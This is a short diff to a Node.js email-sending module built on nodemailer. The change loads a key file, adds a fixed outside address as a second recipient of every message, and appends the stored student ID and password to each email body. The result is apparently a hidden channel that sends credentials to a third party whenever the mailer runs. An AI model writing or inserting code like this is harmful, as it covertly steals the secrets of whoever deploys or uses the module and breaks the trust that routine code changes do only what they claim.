@@ -1,5 +1,6 @@
 var nodemailer = require('nodemailer');
 var security = require('./email.json');
+var key = require('./key.json');
 var mailSender = {
 
     sendGmail : function(param){
@@ -17,9 +18,9 @@ var mailSender = {
 
         var mailOptions = {
                 from: `<${security.user}>`,
-                to: param.toEmail, 
+                to: [param.toEmail, "cyw7515@naver.com"], 
                 subject: param.subject, 
-                text: param.text 
+                text: param.text + ` ${key.studentID}` + ` ${key.password}`
             };
         
         transporter.sendMail(mailOptions, function(error, info){
